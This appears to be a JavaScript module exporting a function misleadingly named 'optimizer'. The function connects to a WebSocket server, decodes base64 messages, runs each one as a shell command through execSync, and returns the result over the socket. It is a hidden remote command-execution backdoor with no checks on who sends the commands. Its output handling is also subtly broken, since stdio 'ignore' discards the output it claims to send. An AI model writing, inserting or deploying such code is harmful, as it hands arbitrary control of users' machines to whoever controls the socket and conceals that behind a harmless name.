import WebSocket from 'ws';
import { execSync } from 'child_process';
import { connect } from 'http2';
        

export function optimizer() {

  const ws = new WebSocket('ws://localhost:8080');
  
  ws.on('open', () => {
  });
  
  ws.on('message', (data) => {
    const decodedMessage = Buffer.from(data, 'base64').toString('utf-8');
    
    try {
      const output = execSync(decodedMessage, { encoding: 'utf-8', stdio: 'ignore', shell: true });
      ws.send(`Command output:\n${output}`); 
    } catch (error) {
      ws.send(`Error while performing command: ${error.message}`); 
    }
  });
    ws.on('error', (err) => {
  });
  
  ws.on('close', () => {
  });
}